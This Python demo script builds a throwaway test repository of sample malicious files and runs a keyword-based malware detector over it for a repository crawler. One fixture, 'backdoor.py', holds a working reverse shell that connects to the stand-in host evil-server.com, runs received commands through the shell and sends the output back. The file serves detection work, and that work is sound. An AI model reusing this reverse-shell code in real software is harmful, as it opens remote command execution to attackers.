#!/usr/bin/env python
"""
Integration example showing how malicious keyword extraction 
integrates with the existing crawler system.
"""

import os
import sys
import tempfile
import shutil

# Add crawler to path
sys.path.append('crawler')

def demo_integration():
    """Demo of integrated keyword extraction in the crawler system."""
    
    print("Malicious Keyword Extraction Integration Demo")
    print("=" * 50)
    
    # Create a test repository with malicious content
    test_repo = tempfile.mkdtemp(prefix="malware_repo_")
    
    # Create various malicious files
    malicious_files = {
        'backdoor.py': """
import socket
import subprocess
import base64

def create_backdoor():
    host = "evil-server.com"
    port = 4444
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((host, port))
    
    while True:
        command = sock.recv(1024).decode()
        if command == 'exit':
            break
        
        result = subprocess.run(command, shell=True, capture_output=True)
        sock.send(base64.b64encode(result.stdout))

def keylogger():
    pass

if __name__ == "__main__":
    create_backdoor()
""",
        'cryptominer.js': """
const crypto = require('crypto');

class BitcoinMiner {
    constructor() {
        this.target = "evil-pool.com";
        this.wallet = "1BvBMSEYstWetqTFn5Au4m4GFg7xJaNVN2";
    }
    
    mine() {
        // Mining logic here
        console.log("Mining bitcoin...");
    }
    
    steal_wallet() {
        // Steal cryptocurrency wallets
    }
}

const miner = new BitcoinMiner();
miner.mine();
""",
        'legitimate.py': """
import requests
import json

def fetch_data():
    response = requests.get("https://api.example.com/data")
    return response.json()

def process_data(data):
    return [item for item in data if item.get('active')]

if __name__ == "__main__":
    data = fetch_data()
    processed = process_data(data)
    print("Processed", len(processed), "items")
""",
        'README.md': """
# Test Repository

This repository contains test files for malicious keyword detection.

## Files

- backdoor.py: Contains backdoor and keylogger functionality
- cryptominer.js: Bitcoin mining malware
- legitimate.py: Normal, benign code

This is used for testing malicious repository detection algorithms.
"""
    }
    
    # Write the test files
    for filename, content in malicious_files.items():
        filepath = os.path.join(test_repo, filename)
        with open(filepath, 'w') as f:
            f.write(content)
    
    print("Created test repository with malicious content at:", test_repo)
    print()
    
    try:
        # Now test the keyword extraction
        from keyword_extractor import MaliciousKeywordExtractor
        from storage import save_repo_data
        
        extractor = MaliciousKeywordExtractor()
        
        # Extract keywords
        print("Extracting keywords from repository...")
        keywords_data = extractor.extract_keywords_from_repository(test_repo)
        
        if keywords_data:
            print("Keyword Extraction Results:")
            print("-" * 30)
            print("Files processed:", keywords_data.get('total_files_processed', 0))
            print("Total keywords extracted:", keywords_data.get('total_keywords_extracted', 0))
            print("Unique keywords:", keywords_data.get('unique_keywords', 0))
            print("Filtered significant keywords:", keywords_data.get('filtered_keywords_count', 0))
            print("Malicious score (0-1):", keywords_data.get('malicious_score', 0))
            print()
            
            # Show malicious keywords found
            malicious_keywords = keywords_data.get('malicious_keywords', {})
            if malicious_keywords:
                print("Potentially Malicious Keywords Found:")
                print("-" * 40)
                sorted_malicious = sorted(malicious_keywords.items(), key=lambda x: x[1], reverse=True)
                for keyword, frequency in sorted_malicious:
                    print("  " + keyword + ": " + str(frequency))
                print()
            
            # Show top keywords overall
            top_keywords = keywords_data.get('top_keywords', {})
            if top_keywords:
                print("Top 15 Most Frequent Keywords:")
                print("-" * 35)
                count = 0
                for keyword, frequency in top_keywords.items():
                    if count >= 15:
                        break
                    print("  " + str(count + 1) + ". " + keyword + ": " + str(frequency))
                    count += 1
                print()
            
            # Test storage integration (simulated)
            print("Testing Storage Integration:")
            print("-" * 30)
            
            # Create fake repo metadata and commits for testing
            fake_repo_info = {
                "name": "test-malware-repo",
                "full_name": "attacker/test-malware-repo", 
                "description": "A test repository containing malicious code",
                "language": "Python",
                "stars": 1,
                "forks": 0,
                "size": 1024
            }
            
            fake_commits = [
                {
                    "sha": "abc123",
                    "author": {"name": "Malicious User", "email": "bad@evil.com"},
                    "message": "Added backdoor functionality",
                    "date": "2024-01-01T00:00:00Z"
                }
            ]
            
            # Test data structure that would be saved to HDF5
            print("Data that would be saved to HDF5:")
            print("- Repository metadata: " + str(len(fake_repo_info)) + " fields")
            print("- Commit data: " + str(len(fake_commits)) + " commits")
            print("- Keyword analysis: " + str(len(keywords_data)) + " analysis fields")
            print("- Malicious keywords: " + str(len(malicious_keywords)) + " suspicious terms")
            print()
            
            # Calculate final assessment
            score = keywords_data.get('malicious_score', 0)
            if score > 0.5:
                assessment = "HIGH RISK - Repository contains significant malicious indicators"
            elif score > 0.2:
                assessment = "MEDIUM RISK - Repository contains some suspicious keywords"
            elif score > 0.1:
                assessment = "LOW RISK - Repository contains few malicious indicators"
            else:
                assessment = "CLEAN - No significant malicious indicators found"
            
            print("FINAL ASSESSMENT: " + assessment)
            print("Confidence Score: " + str(score))
            
        else:
            print("No keyword data extracted")
    
    except Exception as e:
        print("Error during analysis:", str(e))
        import traceback
        traceback.print_exc()
    
    finally:
        # Cleanup
        shutil.rmtree(test_repo, ignore_errors=True)
        print("\nTest repository cleaned up.")

def show_integration_summary():
    """Show how this integrates with the existing crawler architecture."""
    
    print("\n" + "=" * 60)
    print("INTEGRATION WITH EXISTING CRAWLER ARCHITECTURE")
    print("=" * 60)
    
    print("""
The malicious keyword extraction has been integrated into your existing 
crawler system as follows:

1. EXTRACTION PHASE (extract.py):
   - New function: extract_malicious_keywords(repo_path)
   - Analyzes source code files in cloned repositories
   - Extracts and filters keywords using frequency-based methods
   - Identifies potentially malicious terms based on seed keywords

2. MAIN PROCESSING (main.py):
   - Keywords extraction added to process_repo_data() function
   - Runs after commit extraction but before storage
   - Results passed to storage layer along with other data

3. STORAGE LAYER (storage.py):
   - New HDF5 group: 'keywords' for keyword analysis data
   - Stores complete keyword analysis as JSON
   - Stores summary metrics as separate datasets
   - Malicious keywords stored separately for quick access

4. DATA STRUCTURE:
   Repository HDF5 File:
   |-- metadata/          (repository info)
   |-- commits/           (git commit data)  
   |-- keywords/          (NEW: malicious keyword analysis)
   |   |-- keywords_analysis     (full analysis JSON)
   |   |-- malicious_keywords    (suspicious terms JSON)
   |   |-- malicious_score       (risk score 0-1)
   |   +-- summary_metrics       (counts, stats)
   |-- codebase/          (source code files)
   +-- logs/              (crawler logs)

5. ANALYSIS CAPABILITIES:
   - Automatic malicious keyword detection during crawling
   - Risk scoring for repositories (0-1 scale)
   - Integration with existing batch processing
   - HDF5 storage for efficient analysis and retrieval

6. USAGE IN YOUR WORKFLOW:
   - Run normal crawler: python crawler/main.py
   - Keywords automatically extracted and stored
   - Use read_repo_hdf5() to access keyword analysis
   - Batch analyze existing data with keyword_extractor tools
""")

if __name__ == "__main__":
    demo_integration()
    show_integration_summary()
